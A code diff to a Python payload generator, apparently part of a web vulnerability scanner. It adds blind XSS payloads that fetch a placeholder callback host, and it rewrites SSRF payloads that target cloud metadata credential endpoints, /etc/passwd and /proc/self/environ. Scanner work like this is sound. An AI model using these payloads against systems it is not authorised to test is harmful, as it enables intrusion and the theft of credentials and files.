@@ -30,6 +30,30 @@ class PayloadGenerator:
         '<% alert(1) %>',
     ]
 
+    # Blind XSS payloads - these will trigger callbacks to our collector
+    BLIND_XSS_PAYLOADS = [
+        # Basic blind XSS with image callback
+        '<img src=x onerror="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">',
+        # Script-based callback
+        '<script>fetch("https://yourdomain.com/xss/__TOKEN__")</script>',
+        # SVG onload callback
+        '<svg onload="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">',
+        # Iframe callback
+        '<iframe src="javascript:fetch(\'https://yourdomain.com/xss/__TOKEN__\')"></iframe>',
+        # Form submission callback
+        '<form action="https://yourdomain.com/xss/__TOKEN__" method="POST"><input type="submit"></form>',
+        # Link click callback
+        '<a href="javascript:fetch(\'https://yourdomain.com/xss/__TOKEN__\')">click</a>',
+        # Body onload callback
+        '<body onload="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">',
+        # Input focus callback
+        '<input onfocus="fetch(\'https://yourdomain.com/xss/__TOKEN__\')" autofocus>',
+        # Details toggle callback
+        '<details ontoggle="fetch(\'https://yourdomain.com/xss/__TOKEN__\')" open>',
+        # Marquee start callback
+        '<marquee onstart="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">',
+    ]
+
     # SQLi payloads - basic detection only
     SQLI_PAYLOADS = [
         "' OR '1'='1",
@@ -65,19 +89,24 @@ class PayloadGenerator:
         "[($7*7$)]",
     ]
 
-    # SSRF payloads
+    # SSRF payloads - these will trigger callbacks to our detector
     SSRF_PAYLOADS = [
-        "http://127.0.0.1:8000",
-        "http://localhost:8000",
-        "http://169.254.169.254/",
-        "http://169.254.169.254/latest/meta-data/",
-        "http://metadata.google.internal/",
+        # Internal services
+        "http://127.0.0.1:8000/ssrf/__TOKEN__",
+        "http://localhost:8000/ssrf/__TOKEN__",
+        "http://127.0.0.1:80/ssrf/__TOKEN__",
+        "http://localhost:80/ssrf/__TOKEN__",
+        # Cloud metadata services
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://metadata.google.internal/computeMetadata/v1/",
         "http://instance-data.c.internal/",
+        # Protocol-based
         "gopher://127.0.0.1:25/HELO",
-        "file:///etc/passwd",
-        "file:///proc/self/environ",
         "dict://127.0.0.1:11211/",
         "sftp://127.0.0.1/",
+        # File system access
+        "file:///etc/passwd",
+        "file:///proc/self/environ",
     ]
 
     # Open Redirect payloads
@@ -102,6 +131,8 @@ class PayloadGenerator:
         vuln_type = vuln_type.lower()
         if vuln_type in ("xss", "reflected_xss", "stored_xss"):
             return cls.XSS_PAYLOADS
+        elif vuln_type in ("blind_xss", "blindxss"):
+            return cls.BLIND_XSS_PAYLOADS
         elif vuln_type in ("sqli", "sql_injection"):
             return cls.SQLI_PAYLOADS
         elif vuln_type in ("ssti", "template_injection"):
@@ -115,4 +146,4 @@ class PayloadGenerator:
     @classmethod
     def get_all_payload_types(cls) -> list[str]:
         """List all available payload vulnerability types."""
-        return ["xss", "sqli", "ssti", "ssrf", "openredirect"]
+        return ["xss", "blind_xss", "sqli", "ssti", "ssrf", "openredirect"]
